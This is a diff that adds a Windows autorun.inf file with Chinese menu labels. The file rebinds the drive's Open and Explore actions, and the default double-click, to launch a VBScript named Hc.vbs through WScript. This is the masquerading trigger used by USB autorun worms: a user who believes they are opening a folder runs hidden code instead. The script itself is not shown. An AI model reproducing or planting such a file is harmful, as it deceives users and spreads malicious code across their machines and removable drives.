@@ -1,0 +1,8 @@
+[autorun]
+open=
+shell\n=更换图标 
+shell\open=打开(&O)
+shell\open\Command=WScript.exe Hc.vbs
+shell\open\Default=1
+shell\explore=资源管理器(&X)
+shell\explore\Command=WScript.exe Hc.vbs
